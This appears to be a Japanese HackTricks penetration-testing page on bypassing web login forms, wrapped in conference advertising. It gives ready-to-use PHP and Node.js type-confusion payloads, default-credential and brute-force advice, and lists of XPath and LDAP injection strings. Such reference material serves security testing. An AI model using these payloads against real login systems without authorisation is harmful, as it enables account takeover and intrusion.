# ログインバイパス

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) は **スペイン** で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ** で最も重要なイベントの一つです。**技術的知識の促進**を使命とし、この会議はあらゆる分野の技術とサイバーセキュリティの専門家が集まる熱い交流の場です。

{% embed url="https://www.rootedcon.com/" %}

## **通常のログインをバイパスする**

ログインページを見つけた場合、バイパスするためのいくつかの技術を試すことができます：

- ページ内の**コメント**を確認する（下にスクロールして右に？）
- **制限されたページに直接アクセス**できるか確認する
- **パラメータを送信しない**（何も送信しないか、1つだけ送信する）
- **PHPの比較エラーを確認する:** `user[]=a&pwd=b` , `user=a&pwd[]=b` , `user[]=a&pwd[]=b`
- **コンテンツタイプをjsonに変更**し、json値を送信する（bool trueを含む）
- POSTがサポートされていないという応答が返ってきた場合、**GETリクエストでボディにJSONを送信**することを試みる（`Content-Type: application/json`）
- nodejsの潜在的な解析エラーを確認する（[**これ**](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)を読む）：`password[password]=1`
- Nodejsはそのペイロードを次のようなクエリに変換します：` SELECT id, username, left(password, 8) AS snipped_password, email FROM accounts WHERE username='admin' AND`` `` `**`password=password=1`**`;` これにより、パスワードビットが常に真になります。
- JSONオブジェクトを送信できる場合、`"password":{"password": 1}`を送信してログインをバイパスできます。
- このログインをバイパスするには、**有効なユーザー名を知って送信する必要がある**ことを忘れないでください。
- `mysql.createConnection`を呼び出す際に**`"stringifyObjects":true`**オプションを追加すると、**`Object`がパラメータに渡されたときのすべての予期しない動作をブロック**できます。
- 認証情報を確認する：
- 使用されている技術/プラットフォームの[**デフォルトの認証情報**](../../generic-hacking/brute-force.md#default-credentials)
- **一般的な組み合わせ**（root、admin、password、技術の名前、これらのパスワードのいずれかを持つデフォルトユーザー）。
- **Cewl**を使用して辞書を作成し、**デフォルト**のユーザー名とパスワード（ある場合）を追加し、すべての単語を**ユーザー名とパスワード**としてブルートフォースを試みる
- **より大きな辞書を使用してブルートフォース**（**[**ブルートフォース**](../../generic-hacking/brute-force.md#http-post-form)**）

### SQLインジェクション認証バイパス

[ここでは、**SQLインジェクション**を介してログインをバイパスするためのいくつかのトリックを見つけることができます](../sql-injection/#authentication-bypass)。

次のページでは、SQLインジェクションを介してログインをバイパスするための**カスタムリスト**を見つけることができます：

{{#ref}}
sql-login-bypass.md
{{#endref}}

### NoSQLインジェクション認証バイパス

[ここでは、**NoSQLインジェクション**を介してログインをバイパスするためのいくつかのトリックを見つけることができます](../nosql-injection.md#basic-authentication-bypass)**。**

NoSQLインジェクションはパラメータの値を変更する必要があるため、手動でテストする必要があります。

### XPathインジェクション認証バイパス

[ここでは、**XPathインジェクション**を介してログインをバイパスするためのいくつかのトリックを見つけることができます](../xpath-injection.md#authentication-bypass)
```
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2
```
### LDAPインジェクション認証バイパス

[ここでは、**LDAPインジェクション**を介してログインをバイパスするためのいくつかのトリックを見つけることができます。](../ldap-injection.md#login-bypass)
```
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
```
### Remember Me

ページに "**Remember Me**" 機能がある場合、その実装方法を確認し、**他のアカウントを乗っ取る**ために悪用できるかどうかを見てください。

### Redirects

ページは通常、ログイン後にユーザーをリダイレクトします。そのリダイレクトを変更して [**Open Redirect**](../open-redirect.md) を引き起こすことができるか確認してください。ユーザーを自分のウェブサイトにリダイレクトすると、情報（コード、クッキーなど）を盗むことができるかもしれません。

## Other Checks

- ログイン機能を悪用して **ユーザー名を列挙** できるか確認してください。
- パスワード/**sensitive** 情報 **フォーム** **入力** に **自動補完** が有効になっているか確認してください: `<input autocomplete="false">`

## Automatic Tools

- [HTLogin](https://github.com/akinerkisa/HTLogin)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) は **スペイン** で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ** で最も重要なイベントの一つです。**技術的知識の促進**を使命とし、この会議はあらゆる分野の技術とサイバーセキュリティの専門家が集まる熱い交流の場です。

{% embed url="https://www.rootedcon.com/" %}

{{#include ../../banners/hacktricks-training.md}}
